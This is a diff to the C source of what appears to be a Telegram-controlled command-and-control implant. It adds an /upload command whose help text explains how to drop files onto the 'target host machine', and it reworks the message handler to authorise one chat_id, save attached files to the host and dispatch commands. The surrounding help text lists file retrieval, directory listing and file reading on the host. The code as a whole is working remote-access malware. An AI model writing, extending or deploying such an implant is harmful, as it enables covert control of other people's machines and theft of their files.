@@ -517,6 +517,14 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                 }
             }
         }
+    } else if (match_command(text, "upload") || match_command(text, "put") ||
+               match_command(text, "sendfile") || match_command(text, "upfile")) {
+        telegram_send_html("📤 <b>Upload File to Host</b>\n\n"
+                           "To upload a file to the target host machine:\n"
+                           "1. Attach and send any file or document in this chat.\n"
+                           "2. <i>(Optional)</i> Add a caption with the destination path (e.g. <code>/tmp/dest.txt</code> or <code>C:\\temp\\</code>).\n"
+                           "3. If no caption is given, the file is saved in the working directory.\n\n"
+                           "💡 <i>Use <code>/ls</code> to explore directories or <code>/getfile</code> to download.</i>");
     } else if (match_command(text, "logs") || match_command(text, "log")) {
         c2t_log_info("listener", "Flushing logs on-demand by /logs command");
         c2t_log_sender_dispatch_now();
@@ -635,6 +643,7 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
 
         static const char file_sec[] = "<b>File Management:</b>\n"
                                        "• <code>/getfile &lt;path&gt;</code> - Retrieve &amp; send file from host\n"
+                                       "• <code>/upload [path]</code> - Instructions for uploading files to host\n"
                                        "• <code>/ls [path]</code> - List directory contents\n"
                                        "• <code>/cat &lt;path&gt;</code> - View text file contents\n"
                                        "• <code>/fileinfo &lt;path&gt;</code> - View file or directory metadata";
@@ -647,14 +656,39 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
     }
 }
 
-static void on_telegram_command_received([[maybe_unused]] int64_t update_id,
-                                        const char *chat_id,
-                                        const char *username,
-                                        const char *text,
-                                        [[maybe_unused]] void *user_data)
+static void on_telegram_command_received(const telegram_incoming_update_t *update,
+                                         [[maybe_unused]] void *user_data)
 {
-    if (text && *text) {
-        handle_command(text, chat_id ? chat_id : "", username ? username : "");
+    if (!update) return;
+
+    const c2t_config_t *config = c2t_config_get();
+    if (!config->telegram_chat_id || !*config->telegram_chat_id) {
+        c2t_log_warning("listener", "Telegram chat_id is not configured");
+        return;
+    }
+
+    const char *cfg_chat = config->telegram_chat_id;
+    const char *chat_id = update->chat_id ? update->chat_id : "";
+    while (isspace((unsigned char)*cfg_chat)) cfg_chat++;
+    while (isspace((unsigned char)*chat_id)) chat_id++;
+
+    if (strcmp(chat_id, cfg_chat) != 0) {
+        c2t_log_warning("listener", "Ignored update from unauthorized chat_id: %s (authorized: %s)",
+                        chat_id, cfg_chat);
+        return;
+    }
+
+    /* If incoming update has an attached file/document/photo */
+    if (update->file_id && *update->file_id) {
+        c2t_log_info("listener", "Received file attachment (name='%s', file_id=%s) from chat %s",
+                     update->file_name ? update->file_name : "", update->file_id, chat_id);
+        (void)c2t_file_save_uploaded(update->file_id, update->file_name, update->caption);
+        return;
+    }
+
+    /* Handle text command */
+    if (update->text && *update->text) {
+        handle_command(update->text, chat_id, update->username ? update->username : "");
     }
 }
 
